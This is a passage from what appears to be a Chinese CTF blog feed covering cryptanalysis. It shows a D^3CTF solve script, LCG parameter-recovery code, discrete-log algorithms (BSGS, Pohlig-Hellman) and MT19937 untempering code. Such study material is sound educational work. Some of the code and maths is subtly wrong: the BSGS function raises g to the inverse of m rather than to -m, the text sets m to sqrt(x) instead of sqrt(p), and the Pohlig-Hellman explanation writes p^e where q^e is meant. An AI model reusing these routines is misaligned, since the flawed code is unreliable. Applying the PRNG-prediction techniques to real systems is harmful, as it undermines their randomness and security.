class="number">76690363131011946213452652559942001330069215655966537979569408116015163064102321200576</span>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">q = <span class="number">91021224151656818244208716736217812503118228056187318636281925498956930242472205943728</span>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">C = [<span class="number">63173987757788284988620600191109581820396865828379773315280703314093571300861961873159324234626635582246705378908610341772657840682572386153960342976445563045427986000105931341168525422286612417662391801508953619857648844420751306271090777865836201978470895906780036112804110135446130976275516908136806153488</span>, <span class="number">9763526786754236516067080717710975805995955013877681492195771779269768465872108434027813610978940562101906769209984501196515248675767910499405415921162131390513502065270491854965819776080041506584540996447044249409209699608342257964093713589580983775580171905489797513718769578177025063630080394722500351718</span>, <span class="number">37602000735227732258462226884765737048138920479521815995321941033382094711120810035265327876995207117707635304728511052367297062940325564085193593024741832905771507189762521426736369667607865137900432117426385504101413622851293642219573920971637080154905579082646915297543490131171875075081464735374022745371</span>, <span class="number">1072671768043618032698040622345664216689606325179075270470875647188092538287671951027561894188700732117175202207361845034630743422559130952899064461493359903596018309221581071025635286144053941851624510600383725195476917014535032481197737938329722082022363122585603600777143850326268988298415885565240343957</span>, <span class="number">27796821408982345007197248748277202310092789604135169328103109167649193262824176309353412519763498156841477483757818317945381469765077400076181689745139555466187324921460327576193198145058918081061285618767976454153221256648341316332169223400180283361166887912012807743326710962143011946929516083281306203120</span>, <span class="number">27578857139265869760149251280906035333246393024444009493717159606257881466594628022512140403127178174789296810502616834123420723261733024810610501421455454191654733275226507268803879479462533730695515454997186867769363797096196096976825300792616487723840475500246639213793315097434400920355043141319680299224</span>, <span class="number">29771574667682104634602808909981269404867338382394257360936831559517858873826664867201410081659799334286847985842898792091629138292008512383903137248343194156307703071975381090326280520578349920827357328925184297610245746674712939135025013001878893129144027068837197196517160934998930493581708256039240833145</span>, <span class="number">33576194603243117173665354646070700520263517823066685882273435337247665798346350495639466826097821472152582124503891668755684596123245873216775681469053052037610568862670212856073776960384038120245095140019195900547005026888186973915360493993404372991791346105083429461661784366706770467146420310246467262823</span>, <span class="number">5843375768465467361166168452576092245582688894123491517095586796557653258335684018047406320846455642101431751502161722135934408574660609773328141061123577914919960794180555848119813522996120885320995386856042271846703291295871836092712205058173403525430851695443361660808933971009396237274706384697230238104</span>, <span class="number">61258574367240969784057122450219123953816453759807167817741267194076389100252707986788076240792732730306129067314036402554937862139293741371969020708475839483175856346263848768229357814022084723576192520349994310793246498385086373753553311071932502861084141758640546428958475211765697766922596613007928849964</span>, <span class="number">13558124437758868592198924133563305430225927636261069774349770018130041045454468021737709434182703704611453555980636131119350668691330635012675418568518296882257236341035371057355328669188453984172750580977924222375208440790994249194313841200024395796760938258751149376135149958855550611392962977597279393428</span>]</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(C)):</span><br><span class="line">    m.append(BSGS(pow(y,phi//e,n),pow(C[i],phi//e,n),n))</span><br><span class="line">    print(m)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)):</span><br><span class="line">    flag = flag + m[len(m)<span class="number">-1</span>-i]</span><br><span class="line">    flag *= e</span><br><span class="line">flag //= e</span><br><span class="line">print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><h2 id="AliceWantFlag"><a href="#AliceWantFlag" class="headerlink" title="AliceWantFlag"></a>AliceWantFlag</h2><p>复现中，估计一周左右更新</p><h2 id="EasyCurve"><a href="#EasyCurve" class="headerlink" title="EasyCurve"></a>EasyCurve</h2><p>据说有非预期，学了佩尔方程然后回来更新</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Wp-for-AntCTF-X-D-3CTF-39-s-crypto&quot;&gt;&lt;a href=&quot;#Wp-for-AntCTF-X-D-3CTF-39-s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Wp for AntCTF X D^3CTF&amp;#39;s crypto&quot;&gt;&lt;/a&gt;Wp for AntCTF X D^3CTF&amp;#39;s crypto&lt;/h1&gt;&lt;p&gt;我的格子和椭圆曲线实在是太烂了，奈何这次比赛基本都是（&lt;/p&gt;
&lt;p&gt;这次只贡献了1k分，我对不起V&amp;amp;N的师傅们呜呜呜&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>LCG</title>
    <link href="http://example.com/2021/03/04/LCG/"/>
    <id>http://example.com/2021/03/04/LCG/</id>
    <published>2021-03-04T01:33:32.000Z</published>
    <updated>2021-03-11T05:30:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LCG"><a href="#LCG" class="headerlink" title="LCG"></a>LCG</h1><p>发现自己没有整过线性同余生成器的东西，今天专门来总解一下</p><a id="more"></a><p><a href="https://tailcall.net/blog/cracking-randomness-lcgs/">参考资料</a></p><h2 id="1、线性同余生成方法"><a href="#1、线性同余生成方法" class="headerlink" title="1、线性同余生成方法"></a>1、线性同余生成方法</h2><p>设A,B,M是一定常数，按照递推公式 $state_{i+1}=(A\times state_i+B)\pmod{M}$ ，其中A称为乘数(multiplier)，B称为增量(increment)，M称为模数(modulus)</p><p>LCG的生成周期理论上应该是M，但大部分情况下会小于M，如果想要追求LCG的最大周期，应符合以下几个条件：</p><ul><li>A与B都是正整数</li><li>A、B、N[0]都比M要小</li><li>B与M互质</li><li>M的所有质因数都能整除A-1</li></ul><h2 id="2、攻击方法"><a href="#2、攻击方法" class="headerlink" title="2、攻击方法"></a>2、攻击方法</h2><p>我们把<code>state</code>均简称为<code>s</code></p><h3 id="1、B未知"><a href="#1、B未知" class="headerlink" title="1、B未知"></a>1、B未知</h3><p>只需获取中间的两个状态值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s_1 &#x3D; (s_0*A+B)%M</span><br></pre></td></tr></table></figure><p>显然 $B = s_1 - s_0\times a\pmod{M}$</p><h3 id="2、A与B未知"><a href="#2、A与B未知" class="headerlink" title="2、A与B未知"></a>2、A与B未知</h3><p>只需获取中间的三个状态值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s_1 &#x3D; (s_0*A+B)%M</span><br><span class="line">s_2 &#x3D; (s_1*A+B)%M</span><br></pre></td></tr></table></figure><p>线性方程，解起来还是挺简单的</p><p>显然 $A = \frac{s_2-s_1}{s_1-s_0}\pmod{M}$ ，于是就转化成了问题1了</p><h3 id="3、A、B、M都不知道-一问三不知"><a href="#3、A、B、M都不知道-一问三不知" class="headerlink" title="3、A、B、M都不知道 一问三不知"></a>3、A、B、M都不知道 <del>一问三不知</del></h3><p>如果获取中间的7个状态值，就很有可能能够成功，数论里：如果有几个随机数分别乘以n，那么这几个数的欧几里德算法(gcd)就很可能等于n</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">114514</span></span><br><span class="line">print(reduce(gcd, [randint(<span class="number">1</span>, <span class="number">1000000</span>)*x, randint(<span class="number">1</span>, <span class="number">1000000</span>)*x, randint(<span class="number">1</span>, <span class="number">1000000</span>)*x, randint(<span class="number">1</span>, <span class="number">1000000</span>)*x]))</span><br><span class="line"><span class="comment"># 114514</span></span><br></pre></td></tr></table></figure><p>所以我们可以利用这个性质，来尝试得到M，于是问题就被转化成了问题2</p><h2 id="整合"><a href="#整合" class="headerlink" title="整合"></a>整合</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lcg_attack</span>:</span></span><br><span class="line">    <span class="comment"># unknown B (increment)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lcgattack1</span>(<span class="params">self, states, modulus, multiplier</span>):</span></span><br><span class="line">        <span class="keyword">if</span>(len(states)&lt;<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;#####Invalid lenth of states! The lenth should be 2 at least!##### - Dawn_whisper&quot;</span>)</span><br><span class="line">        increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>] * multiplier) % modulus</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;multiplier&#x27;</span>:int(multiplier), <span class="string">&#x27;increment&#x27;</span>:int(increment), <span class="string">&#x27;modulus&#x27;</span>:int(modulus)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unknown A (multiplier)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lcgattack2</span>(<span class="params">self, states, modulus</span>):</span></span><br><span class="line">        <span class="keyword">if</span>(len(states)&lt;<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;#####Invalid lenth of states! The lenth should be 3 at least!##### - Dawn_whisper&quot;</span>)</span><br><span class="line">        multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * inverse(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">        <span class="keyword">return</span> self.lcgattack1(states, modulus, multiplier)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># unknown M (modulus)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lcgattack3</span>(<span class="params">self, states</span>):</span></span><br><span class="line">        <span class="keyword">if</span>(len(states)&lt;<span class="number">6</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;#####Invalid lenth of states! The lenth should be 6 at least!##### - Dawn_whisper&quot;</span>)</span><br><span class="line">        diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> zip(states, states[<span class="number">1</span>:])]</span><br><span class="line">        zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> zip(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">        modulus = abs(reduce(gcd, zeroes))</span><br><span class="line">        <span class="keyword">return</span> self.lcgattack2(states, modulus)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;LCG&quot;&gt;&lt;a href=&quot;#LCG&quot; class=&quot;headerlink&quot; title=&quot;LCG&quot;&gt;&lt;/a&gt;LCG&lt;/h1&gt;&lt;p&gt;发现自己没有整过线性同余生成器的东西，今天专门来总解一下&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Discrete logarithm problem</title>
    <link href="http://example.com/2021/02/26/Discrete_logarithm_problem/"/>
    <id>http://example.com/2021/02/26/Discrete_logarithm_problem/</id>
    <published>2021-02-26T10:54:16.000Z</published>
    <updated>2021-03-11T01:17:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Discrete-logarithm-problem"><a href="#Discrete-logarithm-problem" class="headerlink" title="Discrete logarithm problem"></a>Discrete logarithm problem</h1><p>发现自己只是知道离散对数很难求，而且自己拿这玩意也没办法，专门来学一下<del>带老婆问题</del></p><a id="more"></a><h2 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h2><h3 id="生成元"><a href="#生成元" class="headerlink" title="生成元"></a>生成元</h3><p>​    在一个群 G 中，如果 g 是 G 的生成元，即所有 G 中的所有元素都可以被表示成 $y = g^x$ ，此时的 x 我们称为 y 在 G 中的对数</p><h3 id="阶"><a href="#阶" class="headerlink" title="阶"></a>阶</h3><p>​    设 $m\geq 1$ ， $gcd(a,m)=1$ ，使得 $a^d=1\pmod{m}$ 成立的最小正整数 d 称为 a 对模 m 的指数或者阶，我们一般将其记为 $\delta_m(a)$</p><p>​    另：满足 $a^d=1\pmod{m}$ 的<code>d</code>一定满足 $d\mid\varphi(m)$</p><h3 id="原根"><a href="#原根" class="headerlink" title="原根"></a>原根</h3><p>​    当 $\delta_m(a)=\varphi(m)$ 时，称 a 是模 m 的原根，简称 m 的原根</p><p>​    只有 $m=2,4,p^\alpha,2p^\alpha （p为奇素数，\alpha为正整数）$ 时，模 m 的剩余系存在原根（充要条件）</p><h2 id="离散对数"><a href="#离散对数" class="headerlink" title="离散对数"></a>离散对数</h2><h3 id="暴力枚举"><a href="#暴力枚举" class="headerlink" title="暴力枚举"></a>暴力枚举</h3><p><del>万物皆可暴力</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ForceDLP</span>(<span class="params">A,B,P</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(P):</span><br><span class="line">        <span class="keyword">if</span> pow(A,i,P)==B:</span><br><span class="line">            <span class="keyword">return</span> int(i)</span><br></pre></td></tr></table></figure><h3 id="Baby-step-giant-step"><a href="#Baby-step-giant-step" class="headerlink" title="Baby-step giant-step"></a>Baby-step giant-step</h3><p><del>又称北上广深算法 带老婆去了北上广深（bushi</del></p><p>已知 $y = g^x$ ，我们不妨假设 $x=i\cdot m+j$ ，$m = \sqrt{x}$ ，这样 $m^2&gt;n$ ，则这时候一定在<code>[0,m]</code>内存在一组<code>(i,j)</code>满足 $x=i\cdot m+j$</p><p>具体做法就是：因为 $y = g^x=g^{i\cdot m+j}$ ， 则 $y\cdot (g^{-m})^i=g^j$ ，所以我们首先枚举所有的<code>j</code>并存在一个盒子里，接着枚举<code>i</code>，如果能找到相同的结果，这说明我们得到了<code>(i,j)</code></p><p>据说</p><ul><li>每一次 j 的增加表示 “baby-step”，一次乘上 $g$</li><li>每一次 i 的增加表示 “giant-step”，一次乘上 $g^{-m}$</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BSGS</span>(<span class="params">g, y, p</span>):</span></span><br><span class="line">    m = int(sqrt(p))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_square(p):</span><br><span class="line">        m += <span class="number">1</span></span><br><span class="line">    S = &#123;pow(g, j, p): j <span class="keyword">for</span> j <span class="keyword">in</span> range(m)&#125;</span><br><span class="line">    gs = pow(g, inverse(m, p), p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">in</span> S:</span><br><span class="line">            <span class="keyword">return</span> i * m + S[y]</span><br><span class="line">        y = y * gs % p</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h3 id="Pohlig-Hellman-Algorithm"><a href="#Pohlig-Hellman-Algorithm" class="headerlink" title="Pohlig-Hellman Algorithm"></a>Pohlig-Hellman Algorithm</h3><p>​    这种方法适用于当<code>p-1</code>是个光滑数，因为<code>p</code>是个质数，所以 $\varphi(p)=p-1$ ，根据唯一分解定理，我们可以假设 $p-1 =q_1^{e_1}\cdot q_2^{e_2}\cdot q_3^{e_3}\cdots q_n^{e_n}$ ，我们首先分解 $p-1$ 得到因子列表<code>listq</code>，接着计算每一个因子对应的 $g^{\frac{p-1}{q^e}}$ 与 $h^{\frac{p-1}{q^e}}$ ，此时我们就可以较轻松地计算出满足 $({g^{\frac{p-1}{q^e}}})^x=h^{\frac{p-1}{q^e}}\pmod{p}$ 的<code>x&#39;</code>，而此时的<code>x&#39;</code>也满足 $x’ =x\pmod{p^e}$ ，那么我们可以通过许多的因子来得到许多的<code>x&#39;</code>，最后通过CRT即可找到我们最终要求的<code>x</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># g^x = h (mod p)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PohligHellmanDLP</span>(<span class="params">g,h,p</span>):</span></span><br><span class="line">    Lq=pollard_rho_Factor(p<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">assert</span> reduce(<span class="keyword">lambda</span> x,y: x*y, Lq) == p<span class="number">-1</span></span><br><span class="line">    print(Lq)</span><br><span class="line">    Lg=[pow(g,(p<span class="number">-1</span>)//i,p) <span class="keyword">for</span> i <span class="keyword">in</span> Lq]</span><br><span class="line">    Lh=[pow(h,(p<span class="number">-1</span>)//i,p) <span class="keyword">for</span> i <span class="keyword">in</span> Lq]</span><br><span class="line">    length=len(Lq)</span><br><span class="line">    La=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        La.append(ForceDLP(Lg[i],Lh[i],p))</span><br><span class="line">    X=CRT(Lq,La)</span><br><span class="line">    <span class="keyword">if</span> pow(g,X,p)==h:</span><br><span class="line">        print(<span class="string">&quot;Found x! x =&quot;</span>,X)</span><br><span class="line">        <span class="keyword">return</span> X</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line"></span><br><span class="line">p=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">g=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">h=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">start_time=time.time()</span><br><span class="line">x = PohligHellmanDLP(g,h,p)</span><br><span class="line">print(x)</span><br><span class="line">print(<span class="string">&quot;it takes&quot;</span>,time.time()-start_time,<span class="string">&quot;seconds&quot;</span>,)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Discrete-logarithm-problem&quot;&gt;&lt;a href=&quot;#Discrete-logarithm-problem&quot; class=&quot;headerlink&quot; title=&quot;Discrete logarithm problem&quot;&gt;&lt;/a&gt;Discrete logarithm problem&lt;/h1&gt;&lt;p&gt;发现自己只是知道离散对数很难求，而且自己拿这玩意也没办法，专门来学一下&lt;del&gt;带老婆问题&lt;/del&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>MT19937</title>
    <link href="http://example.com/2021/02/03/MT19937/"/>
    <id>http://example.com/2021/02/03/MT19937/</id>
    <published>2021-02-03T13:08:43.000Z</published>
    <updated>2021-03-11T01:16:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="A-study-for-MT19937"><a href="#A-study-for-MT19937" class="headerlink" title="A study for MT19937"></a>A study for MT19937</h1><p>寒假前被一个伪随机数卡了，终于有时间来看看</p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如前文，不会就得学（悲</p><p><a href="https://badmonkey.site/archives/mt19937.html">参考博客</a></p><h2 id="MT19937"><a href="#MT19937" class="headerlink" title="MT19937"></a>MT19937</h2><p>​    MT19937是许多语言的默认伪随机数生成器，其优点为：周期非常长（达到 $2^{19937}-1$ ）、在 $1\leq k\leq 623$ 的维度之间都可以均等分布、速度较快。</p><p>​    MT19937算法主要分为三个部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、基础的梅森旋转链</span><br><span class="line">2、输出处理算法（Tamper）</span><br><span class="line">3、旋转链的旋转算法（Twist）</span><br></pre></td></tr></table></figure><p>python中Random类采用MT19937算法，getrandbits(32)返回一个32位随机数，详细代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_int32</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> int(<span class="number">0xFFFFFFFF</span> &amp; x)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MT19937</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, seed</span>):</span></span><br><span class="line">        self.mt = [<span class="number">0</span>] * <span class="number">624</span></span><br><span class="line">        self.mt[<span class="number">0</span>] = seed</span><br><span class="line">        self.mti = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">624</span>):</span><br><span class="line">            self.mt[i] = _int32(<span class="number">1812433253</span> * (self.mt[i - <span class="number">1</span>] ^ self.mt[i - <span class="number">1</span>] &gt;&gt; <span class="number">30</span>) + i)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extract_number</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.mti == <span class="number">0</span>:</span><br><span class="line">            self.twist()</span><br><span class="line">        y = self.mt[self.mti]</span><br><span class="line">        y = y ^ y &gt;&gt; <span class="number">11</span></span><br><span class="line">        y = y ^ y &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br><span class="line">        y = y ^ y &lt;&lt; <span class="number">15</span> &amp; <span class="number">4022730752</span></span><br><span class="line">        y = y ^ y &gt;&gt; <span class="number">18</span></span><br><span class="line">        self.mti = (self.mti + <span class="number">1</span>) % <span class="number">624</span></span><br><span class="line">        <span class="keyword">return</span> _int32(y)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twist</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">624</span>):</span><br><span class="line">            y = _int32((self.mt[i] &amp; <span class="number">0x80000000</span>) + (self.mt[(i + <span class="number">1</span>) % <span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>))</span><br><span class="line">            self.mt[i] = (y &gt;&gt; <span class="number">1</span>) ^ self.mt[(i + <span class="number">397</span>) % <span class="number">624</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> y % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                self.mt[i] = self.mt[i] ^ <span class="number">0x9908b0df</span></span><br></pre></td></tr></table></figure><h2 id="针对题目"><a href="#针对题目" class="headerlink" title="针对题目"></a>针对题目</h2><h3 id="1-逆向extract-number"><a href="#1-逆向extract-number" class="headerlink" title="1.逆向extract_number"></a>1.逆向extract_number</h3><p>我们发现这其中有两种操作是较难的，我们先来看这一种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y = y ^ y &gt;&gt; <span class="number">11</span></span><br></pre></td></tr></table></figure><p>显而易见，这种操作并不会对<code>y</code>的高18位有任何影响，所以<code>y&#39;=y ^ y &gt;&gt; 11</code>的高18位就是<code>y</code>的高18位，而<code>y&#39;</code>接下来的18位正是<code>y</code>的高18位和<code>y</code>接下来的18位异或得来的，所以我们可以使用已知的高18位得到接下来的18位，同上，每操作一次我们就可得到<code>y</code>的18位，所以我们就能利用<code>y&#39;</code>通过有限的操作后复原之前的<code>y</code>，实现代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">y1 = </span><br><span class="line">y = y1^y1&gt;&gt;<span class="number">11</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>//<span class="number">11</span>):</span><br><span class="line">    y = y1^(y&gt;&gt;<span class="number">11</span>)</span><br><span class="line">print(y)</span><br><span class="line">print(y1)</span><br></pre></td></tr></table></figure><p>分析完这一种，我们来看下一种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y = y ^ y &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br></pre></td></tr></table></figure><p>类比上一种，<code>y&#39;</code>的低7位实际上就是<code>y^2636928640</code>的结果，可以轻松的获得<code>y</code>的低7位，我们可以将<code>y&lt;&lt;7&amp;2636928640</code>当做一个整体（也就是说掩码其实并没有实质性的作用），这样模仿前一种操作，复原代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">y1 = </span><br><span class="line">y = y1^ y1 &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br><span class="line">tmp = y</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span> // <span class="number">7</span>):</span><br><span class="line">    y = tmp ^ y &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br><span class="line">print(y)</span><br><span class="line">print(y1)</span><br></pre></td></tr></table></figure><p>我们将左移和右移（带掩码与不带掩码）的复原代码整理如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">unBitShift</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">RightXor</span>(<span class="params">self,value,shift,bits=<span class="number">32</span></span>):</span></span><br><span class="line">        tmp = value</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(bits // shift):</span><br><span class="line">            tmp = value ^ tmp &gt;&gt; shift</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">RightXorMasked</span>(<span class="params">self,value,shift,mask,bits=<span class="number">32</span></span>):</span></span><br><span class="line">        tmp = value</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(bits // shift):</span><br><span class="line">            tmp = value ^ tmp &gt;&gt; shift &amp; mask</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LeftXor</span>(<span class="params">self,value, shift,bits=<span class="number">32</span></span>):</span></span><br><span class="line">        tmp = value</span><br><span class="line">        